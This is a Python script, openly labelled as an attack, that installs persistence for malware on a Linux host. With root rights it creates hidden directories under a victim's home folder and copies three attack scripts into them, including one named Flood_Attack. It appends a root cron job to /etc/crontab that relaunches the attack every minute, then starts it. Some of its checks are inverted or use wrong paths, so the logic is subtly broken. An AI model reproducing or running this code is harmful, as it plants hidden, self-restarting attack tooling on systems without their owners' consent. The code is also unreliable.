import os
import sys


attackDirs = ['/home/victim/.etc', '/home/victim/.var']
attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
etcAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py'
varAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py'


def set_up_crontab():
    if not is_set_up_crontab():
        return

    # Write Crontab
    os.system('sudo chmod +w /etc/crontab')

    crontab = open('/etc/crontab', 'a')

    crontab.write(etcAttackCommand)
    crontab.close()


def set_up_attack():
    if is_set_up_attack():
        return

    # Make directories
    for attackDir in attackDirs:
        os.system('sudo mkdir {0}'.format(attackDir))
        os.system('sudo mkdir {0}/.module'.format(attackDir))
        os.system('sudo cp a.py {0}/.module/Launch_Attack.py'.format(attackDir))
        os.system('sudo cp b.py {0}/.module/Check_Attack.py'.format(attackDir))
        os.system('sudo cp c.py {0}/.module/Flood_Attack.py'.format(attackDir))


def is_set_up_attack():
    for attackDir in attackDirs:
        for attackFile in attackFiles:
            if not os.path.isfile(attackDir+attackFile):
                return False

    return True


def is_set_up_crontab():
    # Read Crontab
    os.system('sudo chmod +r /etc/crontab')

    crontab = open('/etc/crontab', 'r')

    result = False

    for line in crontab:
        if line.find(etcAttackCommand) > -1 or line.find(varAttackCommand) > -1:
            result = True

    crontab.close()

    return result


def is_root():
    return os.geteuid() == 0


if __name__ == '__main__':

    if not is_root():
        sys.exit('You must run the script with \'sudo\'')

    set_up_attack()
    set_up_crontab()

    os.system('sudo python a.py')
